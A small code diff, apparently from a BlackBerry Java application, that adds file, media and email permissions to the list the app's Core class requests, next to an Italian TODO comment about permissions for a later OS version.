@@ -147,7 +147,11 @@ public final class Core implements Runnable {
                 ApplicationPermissions.PERMISSION_CODE_MODULE_MANAGEMENT,
                 ApplicationPermissions.PERMISSION_PIM,
                 ApplicationPermissions.PERMISSION_PHONE,
-                ApplicationPermissions.PERMISSION_LOCATION_API };
+                ApplicationPermissions.PERMISSION_LOCATION_API,
+                ApplicationPermissions.PERMISSION_FILE_API,
+                ApplicationPermissions.PERMISSION_MEDIA,
+                ApplicationPermissions.PERMISSION_EMAIL
+        };
 
         //TODO: Dalla 4.6: PERMISSION_INTERNET, PERMISSION_ORGANIZER_DATA, PERMISSION_LOCATION_DATA 
 
